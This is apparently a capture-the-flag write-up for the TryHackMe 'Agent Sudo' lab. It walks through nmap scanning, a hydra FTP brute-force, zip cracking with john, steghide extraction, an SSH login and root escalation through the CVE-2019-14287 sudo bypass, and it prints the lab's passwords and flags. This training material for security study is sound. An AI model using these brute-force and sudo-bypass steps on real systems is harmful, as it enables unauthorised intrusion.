
# Task 1: (Start the machine)

```
export IP=10.10.144.134
```

# Task 2: (Ennumerate)

```(nmap scan)

nmap -sS -sV -vv -Pn $IP

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

User-Agent: C from hint.
Agent Chris


# Task 3: (Hash cracking and Bruteforce)

```(hydra brute)

hydra -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp -V

[21][ftp] host: 10.10.144.134   login: chris   password: crystal
```

```(ftp login)

ftp $IP
username: chris
password: crystal

ftp> passive
passive mode on
ftp> ls
ftp> get [filename] 
```


We get two image files and a txt file.

Lets analyse the file with binwalk

```(binwalk)
Scan Time:     2020-07-17 12:04:54
Target File:   /root/tryhackme/AgentSudo/cute-alien.jpg
MD5 Checksum:  502df001346ac293b2d2cb4eeb5c57cc
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


Scan Time:     2020-07-17 12:04:54
Target File:   /root/tryhackme/AgentSudo/cutie.png
MD5 Checksum:  7d0590aebd5dbcfe440c185160c73c9e
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22


Scan Time:     2020-07-17 12:04:54
Target File:   /root/tryhackme/AgentSudo/To_agentJ.txt
MD5 Checksum:  23c8ba1d92596458cd240cf2029cdc63
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
```

# Task 3: (Hash cracking and brute-force)

We extract the png file to get the zip file

```(binwalk extract)

binwalk cutie.png -e

```

We obtain a zip file, lets crack the hash using rockyou wordlist to obtain the pass.

```(zip cracking)

zip2john 8702.zip > crack.txt

john --format=zip --wordlist=/usr/share/wordlist/rockyou.txt crack.txt

```

Password is Alien.

When we extract the zip with this password we obtain a base64 encoded text. Decode it to obtain text Area51 as the password for the text file.

Using steghide to extract the data

```(steghide)

steghide extract -sf cute-alien.jpg
```

This file has username and the ssh password

# Task 4: (Capture the user flag)

Using SSH to login to the server.

```(ssh)
ssh james@$IP
password: hackerrules!
```

we get the user flag here

```(cat)
cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7 
```

Using scp to copy the image from server to host.

```(scp)

scp james@$IP:/home/james/Alien_autopsy.jpg
```

Using Reverse image on the image we find it to be Roswell alien autopsy incident.

# Task 5: (Priviledge Esclataion)

Trying to run sudo -l prompts us for the password and upon entering the password we see the following results.

```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Upon googling I found this [sudo-vulnerability](https://www.exploit-db.com/exploits/47502) CVE-2019-14287 

Exploit: `sudo -u#-1 /bin/bash`

Upon entering the password, we are loggedin as root.

locate the root flag at (/root/root.txt)

```(root flag)
cat /root/root.txt
b53a02f55b57d4439e3341834d70c062
```


